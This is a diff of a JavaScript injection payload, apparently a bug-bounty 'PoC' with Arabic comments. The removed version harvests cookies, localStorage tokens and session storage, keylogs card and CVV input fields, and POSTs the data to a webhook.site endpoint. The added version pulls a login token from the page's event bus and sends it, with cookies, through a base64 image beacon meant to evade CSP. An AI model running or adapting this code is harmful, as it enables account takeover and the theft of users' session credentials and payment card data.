@@ -1,44 +1,53 @@
-// Path: https://attacker-server.com/script-loader/main.js
+// Path: https://egyhaker.github.io/script-loader/main.js
+
 (function() {
-    const ATTACKER_API = "https://webhook.site/80fc42ae-6762-46f9-8c4d-46641ae6bafe/exfiltrate";
+    console.log("%c⚠️ Security PoC: Monitoring Event Bus for Auth Tokens...", "color: yellow; font-weight: bold;");
 
-    console.warn("🛑 POC: Environment Injection Successful. Executing Payload...");
+    const WEBHOOK_URL = "https://webhook.site/80fc42ae-6762-46f9-8c4d-46641ae6bafe";
 
-    // 1. جمع التوكينات والبيانات الحساسة من الذاكرة
-    const sensitiveData = {
-        victim_url: window.location.href,
-        cookies: document.cookie, // سرقة الـ Session ID
-        localStorage: {
-            auth_token: localStorage.getItem('access_token') || "Not Found",
-            user_data: localStorage.getItem('user_info'),
-            cart_id: localStorage.getItem('cart_id')
-        },
-        sessionStorage: JSON.stringify(sessionStorage)
-    };
-
-    // 2. تتبع ضغطات المفاتيح (Keylogging) لسرقة بيانات البطاقة عند إدخالها
-    document.addEventListener('input', (e) => {
-        const target = e.target;
-        if (target.name && (target.name.includes('card') || target.id.includes('cvv'))) {
-            const keystrokeData = {
-                field: target.name || target.id,
-                value: target.value,
-                timestamp: Date.now()
-            };
-            sendData(keystrokeData);
-        }
-    });
-
-    // 3. وظيفة إرسال البيانات المسروقة لخادم المهاجم
-    function sendData(payload) {
-        fetch(ATTACKER_API, {
-            method: 'POST',
-            mode: 'no-cors', 
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
+    function exfiltrate(data) {
+        // استخدام Image beacon لتجاوز بعض قيود CSP التي قد تمنع fetch
+        const img = new Image();
+        const encodedData = btoa(JSON.stringify(data));
+        img.src = `${WEBHOOK_URL}/leak?d=${encodedData}`;
     }
 
-    // إرسال التوكينات فور التحميل
-    sendData(sensitiveData);
+    function captureToken() {
+        try {
+            // الوصول إلى ناقل الأحداث الذي حددته
+            const bus = window._async_define_cached_dependencies && window._async_define_cached_dependencies["events-bus"];
+            
+            if (bus) {
+                const events = bus.events || bus._events || (typeof bus.getEvents === 'function' ? bus.getEvents() : null);
+                
+                if (events && Array.isArray(events)) {
+                    // البحث عن حدث تسجيل الدخول الناجح
+                    const authEvent = events.find(e => e.args && e.args[0] === "AUTH-SUCCESS-EVENT-v1");
+                    
+                    if (authEvent && authEvent.args[1] && authEvent.args[1].token) {
+                        const token = authEvent.args[1].token;
+                        console.log("%c✅ Token Found!", "color: green; font-weight: bold;");
+                        
+                        exfiltrate({
+                            status: "success",
+                            type: "ATO_TOKEN",
+                            url: window.location.href,
+                            token: token,
+                            cookies: document.cookie
+                        });
+                        return true;
+                    }
+                }
+            }
+        } catch (e) {
+            console.error("Extraction error:", e);
+        }
+        return false;
+    }
+
+    // محاولة الاستخراج فور التحميل
+    if (!captureToken()) {
+        // إذا لم يجد التوكن فوراً، ينتظر قليلاً (في حال كان التحميل جارياً)
+        setTimeout(captureToken, 3000);
+    }
 })();
